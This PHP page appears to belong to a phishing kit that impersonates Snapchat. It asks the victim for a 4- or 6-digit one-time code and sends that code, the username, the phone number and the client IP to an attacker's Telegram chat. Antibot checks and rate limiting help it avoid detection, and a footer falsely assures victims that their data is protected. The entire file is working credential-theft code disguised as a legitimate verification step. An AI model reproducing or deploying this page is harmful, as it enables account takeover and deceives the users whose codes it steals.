<?php

declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';
require __DIR__ . '/includes/antibot.php';

session_start();

$flowId = isset($_GET['f']) ? (string) $_GET['f'] : (isset($_SESSION['flow_id']) ? (string) $_SESSION['flow_id'] : '');
$secret = isset($_GET['s']) ? (string) $_GET['s'] : (isset($_SESSION['flow_secret']) ? (string) $_SESSION['flow_secret'] : '');
$digits = isset($_GET['d']) ? (int) $_GET['d'] : (isset($_POST['digits']) ? (int) $_POST['digits'] : 4);
if ($digits !== 4 && $digits !== 6) {
    $digits = 4;
}

$flow = ($flowId !== '' && $secret !== '') ? app_flow_read($flowId) : null;
if ($flow === null || $flow['secret'] !== $secret) {
    header('Location: index.php', true, 302);
    exit;
}

$_SESSION['flow_id'] = $flowId;
$_SESSION['flow_secret'] = $secret;

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!app_rate_limit_allow('otp_page_get', 60, 600)) {
        http_response_code(429);
        echo 'Trop de requêtes.';
        exit;
    }
    $flow = app_flow_after_otp_link_notify($flowId, $flow, $digits);
    app_flow_write($flowId, $flow);
    app_regenerate_math_challenge();
    app_touch_form_opened('otp');
}

$pseudo = $flow['pseudo'];
$display = '@' . ltrim($pseudo, '@');
$phone = $flow['phone'] ?? '';
$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ab = app_antibot_verify_post('otp', 1.2);
    if ($ab !== '') {
        $error = $ab;
        app_regenerate_math_challenge();
    } else {
        $code = '';
        for ($i = 0; $i < $digits; $i++) {
            $digit = isset($_POST['d' . $i]) ? trim((string) $_POST['d' . $i]) : '';
            if (!preg_match('/^\d$/', $digit)) {
                $code = '';
                break;
            }
            $code .= $digit;
        }
        if (strlen($code) !== $digits) {
            $error = 'Veuillez saisir le code à ' . $digits . ' chiffres.';
            app_regenerate_math_challenge();
        } elseif (!app_telegram_configured()) {
            $error = 'Configuration Telegram incomplète.';
            app_regenerate_math_challenge();
        } else {
            $text = "Code OTP (" . $digits . " chiffres)\nPseudo : " . $pseudo;
            if ($phone !== '') {
                $text .= "\nTéléphone : " . $phone;
            }
            $text .= "\nCode : " . $code;
            $text .= "\nIP envoi : " . app_client_ip();
            $r = app_telegram_send([
                'chat_id' => $config['telegram_chat_id'],
                'text' => $text,
            ]);
            if (!$r['ok']) {
                $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
                app_regenerate_math_challenge();
            } else {
                $success = 'Code envoyé. Merci.';
            }
        }
    }
}

$pageBackground = '#FFFC00';
$css = require __DIR__ . '/includes/snap_styles.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Code OTP — Snap+</title>
    <style><?= $css ?></style>
</head>
<body>
    <div class="card">
        <?php require __DIR__ . '/includes/partials_snap_brand.php'; ?>
        <h1 class="title">Code à <?= $digits ?> chiffres</h1>
        <p class="subtitle">Entrez le code reçu pour <?= htmlspecialchars($display, ENT_QUOTES, 'UTF-8') ?>.</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= $error ?></div>
        <?php endif; ?>
        <?php if ($success !== '') : ?>
            <div class="alert alert-success" role="status"><?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>

        <form method="post" action="">
            <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
            <input type="hidden" name="digits" value="<?= $digits ?>">
            <div class="otp-row">
                <?php for ($i = 0; $i < $digits; $i++) : ?>
                    <input
                        type="text"
                        name="d<?= $i ?>"
                        id="d<?= $i ?>"
                        maxlength="1"
                        pattern="\d"
                        inputmode="numeric"
                        autocomplete="one-time-code"
                        aria-label="Chiffre <?= $i + 1 ?>"
                    >
                <?php endfor; ?>
            </div>
            <button type="submit" class="btn btn-primary">VALIDER</button>
        </form>

        <div class="footer-secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#FF9800" aria-hidden="true">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Vos données sont protégées</span>
        </div>
    </div>
    <script>
        (function () {
            var inputs = document.querySelectorAll('.otp-row input');
            if (!inputs.length) return;
            inputs[0].focus();
            inputs.forEach(function (el, idx) {
                el.addEventListener('input', function () {
                    if (el.value.length >= 1 && inputs[idx + 1]) {
                        el.value = el.value.slice(-1);
                        inputs[idx + 1].focus();
                    }
                });
                el.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !el.value && inputs[idx - 1]) {
                        inputs[idx - 1].focus();
                    }
                });
            });
        })();
    </script>
</body>
</html>
